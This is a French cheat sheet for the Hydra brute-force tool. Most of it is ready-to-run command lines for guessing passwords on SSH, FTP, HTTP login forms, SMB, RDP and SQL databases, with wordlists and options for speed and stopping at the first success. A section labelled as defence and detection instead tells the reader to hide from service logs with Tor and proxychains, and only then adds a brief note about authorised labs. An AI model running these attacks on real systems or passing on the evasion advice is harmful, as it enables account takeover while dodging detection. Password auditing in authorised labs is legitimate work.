# 🐍 Hydra - Cheatsheet CyberSécurité

Hydra est un outil puissant de **bruteforce** multi-protocoles : HTTP, FTP, SSH, RDP, SMB, VNC, MySQL, etc.

---

## ⚙️ 1. Syntaxe de base

hydra -l <utilisateur> -P <wordlist.txt> <ip> <service>  
> Bruteforce avec un seul utilisateur

hydra -L <users.txt> -P <wordlist.txt> <ip> <service>  
> Bruteforce multi-utilisateur

hydra -V -l admin -P rockyou.txt <ip> ftp  
> Mode verbeux (-V) sur FTP

---

## 🌐 2. HTTP / Web login

hydra -l admin -P wordlist.txt <ip> http-get /admin  
> Bruteforce HTTP GET simple

hydra -L users.txt -P pass.txt <ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"  
> Bruteforce POST avec formulaire personnalisé

hydra -L users.txt -P pass.txt <ip> http-form-post "/login.php:user=^USER^&pass=^PASS^:S=Welcome"  
> Variante avec string de succès (S=)

---

## 🔐 3. SSH

hydra -l root -P rockyou.txt ssh://<ip>  
> Bruteforce SSH (port 22)

hydra -L users.txt -P pass.txt ssh://<ip> -t 4  
> SSH avec threads (-t)

---

## 📁 4. FTP

hydra -l anonymous -P /dev/null ftp://<ip>  
> Test login FTP anonyme

hydra -L users.txt -P rockyou.txt ftp://<ip>  
> Bruteforce complet FTP

---

## 🪟 5. SMB / Windows

hydra -L users.txt -P pass.txt smb://<ip>  
> Bruteforce d’accès SMB

---

## 🧠 6. MySQL / PostgreSQL / MSSQL

hydra -L users.txt -P pass.txt mysql://<ip>  
> MySQL bruteforce

hydra -L users.txt -P pass.txt postgres://<ip>  
> PostgreSQL

hydra -L users.txt -P pass.txt mssql://<ip>  
> Microsoft SQL Server

---

## 🖥️ 7. RDP (Remote Desktop)

hydra -L users.txt -P pass.txt rdp://<ip>  
> RDP bruteforce

---

## 🎛️ 8. Options utiles

-t 4  
> Threads parallèles (accélère les tests)

-vV  
> Verbosité : chaque tentative est affichée

-s PORT  
> Spécifie un port non standard

-f  
> Arrête à la première réussite

-o result.txt  
> Sauvegarde des résultats

---

## 🧪 9. Exemples avancés

hydra -l admin -P rockyou.txt <ip> http-post-form "/admin.php:username=^USER^&password=^PASS^:F=Invalid login"  
> Bruteforce POST avec détection de l’échec

hydra -L users.txt -P pass.txt -s 2222 ssh://<ip>  
> SSH sur port personnalisé

---

## 🛑 10. Défense & détection

- Les logs des services (auth.log, web logs) gardent une trace → utilisez Tor, proxychains.
- Ne pas abuser sur des cibles non autorisées.
- Privilégiez l'audit légal et les environnements lab.

---

## 📚 11. Ressources

- [Hydra GitHub (thc-hydra)](https://github.com/vanhauser-thc/thc-hydra)
- [PayloadsAllTheThings - Brute Force](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force)
- [SecLists - Wordlists](https://github.com/danielmiessler/SecLists)

